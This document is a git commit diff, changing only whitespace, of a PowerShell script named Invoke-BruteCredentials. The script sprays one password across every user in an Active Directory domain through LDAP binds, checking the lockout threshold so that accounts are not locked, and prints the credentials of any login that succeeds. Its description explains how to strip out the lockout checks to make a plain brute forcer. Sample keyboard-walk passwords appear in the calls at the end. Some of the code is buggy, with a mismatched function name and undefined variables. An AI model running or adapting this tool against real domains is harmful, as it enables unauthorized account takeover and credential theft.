30aed26d20bf81bb3801078fdffacb1df5179b9b
Rudy <ruddawg26@gmail.com>
2016-10-21 19:31:32 -0400

    Update Invoke-BruteCredentials.ps1
    fixed some white space issues for more readability

--- Invoke-BruteCredentials.ps1
+++ Invoke-BruteCredentials.ps1
@@ -1,27 +1,27 @@
 function Invoke-BruteCredentials
 {
 <#
-.SYNOPSIS
+ .SYNOPSIS
 
-Attempts to validate a password over a list of Users on a Domain.  Uses an LDAP Bind to test authentication
+ Attempts to validate a password over a list of Users on a Domain.  Uses an LDAP Bind to test authentication
 
-Author: Matt "Rudy" Benton @ruddawg26
-Idea-Support: Brian Dillensnyder
-License: BSD 3-Clause
-Required Dependencies: None
-Optional Dependencies: None
+ Author: Matt "Rudy" Benton @ruddawg26 
+ Idea-Support: Brian Dillensnyder
+ License: BSD 3-Clause
+ Required Dependencies: None
+ Optional Dependencies: None
 
-.DESCRIPTION
+ .DESCRIPTION
 
-Attempts to make an LDAP bind from a list of accounts and provided password. Determines Lockout threshold and will not attempt the password guess on that account if the account is within one away from a lockout. Haven't messed with in a few years but did have some errors in a large domain determining accurate lockout for whatever reason.  If just want brute forcer strip out lockout checks.
+ Attempts to make an LDAP bind from a list of accounts and provided password. Determines Lockout threshold and will not attempt the password guess on that account if the account is within one away from a lockout. Haven't messed with in a few years but did have some errors in a large domain determining accurate lockout for whatever reason.  If just want brute forcer strip out lockout checks.
 
-.NOTES
+ .NOTES
 
-.PARAMETER
+ .PARAMETER
 
-.EXAMPLE
+ .EXAMPLE
 
-.LINK
+ .LINK
 
 #>
 
@@ -34,99 +34,88 @@ Attempts to make an LDAP bind from a list of accounts and provided password. Det
 
     )
 
-    Set-StrictMode -Version 2.0
+        Set-StrictMode -Version 2.0
 
-    $passwordList = New-Object System.Collections.ArrayList
-    $userList = New-Object System.Collections.ArrayList
+        $passwordList = New-Object System.Collections.ArrayList
+        $userList = New-Object System.Collections.ArrayList
 
 
-Function Invoke-RandomizeList{
+function Invoke-RandomizeList{
     #A Fisher-Yates Shuffle of the Array
-    [Parameter(Mandatory = $True)]
-    [array]$List
+            [Parameter(Mandatory = $True)]
+            [array]$List
 
-    [int]$n=[int]$x=$List.count-1
-   
-    [array]$tmparray
+            [int]$n=[int]$x=$List.count-1
 
+            [array]$tmparray
 
-    for([int]$n=$List.count; $n -ne 0; $n--) {
-    [int] $i = Get-Random $n
-    $tmparray.add($List[$i])
-    $List.removeat($i)
-    }
-    $List=$tmparray
-    return $List
-   
-    }
+            for([int]$n=$List.count; $n -ne 0; $n--) {
+                    [int] $i = Get-Random $n
+                    $tmparray.add($List[$i])
+                    $List.removeat($i)
+            }
+            $List=$tmparray
+            return $List
+   }
 
 
-try{
-#get current computer domain object
-$OnDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().Name
-$objdomain = [ADSI]""
-}
-catch
-{
-write-host "This computer is not on a Domain"
-}
+        try{
+        #get current computer domain object
+                $OnDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().Name
+                $objdomain = [ADSI]""
+                }
+       catch{
+                write-host "This computer is not on a Domain"
+        }
 
-Write-Verbose "[-] Getting Domain Information"
+        Write-Verbose "[-] Getting Domain Information"
 
-$objdomain=[ADSI]""
+        $objdomain=[ADSI]""
 
-#Get Domain Information
-$Domain = $objdomain.distinguishedname
-$LockoutThreshold = $objdomain.LockOutThreshold
-$MinPwdLength = $objdomain.minpwdlength
-$LockoutDuration = [timespan]([math]::Abs($objdomain.convertLargeIntegerToInt64($objdomain.lockoutduration[0])))
-$LockoutObservationWindow = [timespan]([math]::Abs($objdomain.convertLargeIntegerToInt64($objdomain.lockoutobservationwindow[0])))
+        #Get Domain Information
+        $Domain = $objdomain.distinguishedname
+        $LockoutThreshold = $objdomain.LockOutThreshold
+        $MinPwdLength = $objdomain.minpwdlength
+        $LockoutDuration = [timespan]([math]::Abs($objdomain.convertLargeIntegerToInt64($objdomain.lockoutduration[0])))
+        $LockoutObservationWindow = [timespan]([math]::Abs($objdomain.convertLargeIntegerToInt64($objdomain.lockoutobservationwindow[0])))
 
+        $currentdomain="LDAP://$domain"
+        $users="LDAP://CN=users,$domain"
+        $ManagedServiceAccounts="LDAP://CN=Managed Service Accounts,$domain"
+        #$group="LDAP://
+        $objUsers=[ADSI]$users
 
-$currentdomain="LDAP://$domain"
-$users="LDAP://CN=users,$domain"
-$ManagedServiceAccounts="LDAP://CN=Managed Service Accounts,$domain"
-#$group="LDAP://
-$objUsers=[ADSI]$users
+        #Here add a parameter Domain Additional INFO to display this if set
 
-#Here add a parameter Domain Additional INFO to display this if set
+        $domainprops = @{'MinPwdLength'=$MinPwdLength;
+                         'LockoutThreshold'=$LockoutThreshold;
+                         'LockOutObservationWindow'=$LockOutObservationWindow;
+                         'LockOutDuration'=$LockOutDuration}
 
-$domainprops = @{'MinPwdLength'=$MinPwdLength;
-                 'LockoutThreshold'=$LockoutThreshold;
-                 'LockOutObservationWindow'=$LockOutObservationWindow;
-                 'LockOutDuration'=$LockOutDuration}
+        $domaininfoobj = New-Object -TypeName PSObject -Property $props
 
-$domaininfoobj = New-Object -TypeName PSObject -Property $props
+        $objusers.children |Foreach-Object {
+                #Start-Sleep 2
+                $username= $_.samaccountname
 
+                #First Check to see if account will lockout with one more bad password attempt
+                if([int] $_.badPwdCount.value -lt ($lockoutthreshold.value-1)){
 
-$objusers.children |Foreach-Object {
-#Start-Sleep 2
-$username= $_.samaccountname
+                        #write-Verbose "[-] Checking for $username and $password at $currentdomain"
+                        $querycheck = New-Object System.DirectoryServices.DirectoryEntry($currentdomain, $Username, $Password)
 
-#First Check to see if account will lockout with one more bad password attempt
-If([int] $_.badPwdCount.value -lt ($lockoutthreshold.value-1)){
-
-#write-Verbose "[-] Checking for $username and $password at $currentdomain"
-$querycheck = New-Object System.DirectoryServices.DirectoryEntry($currentdomain, $Username, $Password)
-
-if($querycheck.name -eq $null){Write-host "Failed Login" $username }
-
-else{write-host "Successful Login: $Username $Password"}
-}
-else{write-Verbose "$username not tried.  BadPwdCount is "$_.badPwdCount.value}
-}
+                        if($querycheck.name -eq $null){Write-host "Failed Login" $username }
+                        else{write-host "Successful Login: $Username $Password"}
+                        }
+                else{write-Verbose "$username not tried.  BadPwdCount is "$_.badPwdCount.value}
+                }
+        }
 
 
+        Brute-Credentials -verbose '2wsx@WSX2wsx@WSX'
 
+        Brute-Credentials '!QAZxsw2#@EDCvfr4'
 
-}
-
-
-
-Brute-Credentials -verbose '2wsx@WSX2wsx@WSX'
-
-
-Brute-Credentials '!QAZxsw2#@EDCvfr4'
-
-try{$querycheck = New-Object System.DirectoryServices.DirectoryEntry($currentdomain, $Username, $Password)}
-catch{write-host "Failed"}
+       # This was in the code I found, don't rememebr why but if i look at this again maybe I'll remember why this was left uncommented. But brief look makes no sense it was there at bottom of my code
+       # try{$querycheck = New-Object System.DirectoryServices.DirectoryEntry($currentdomain, $Username, $Password)}
+       # catch{write-host "Failed"}
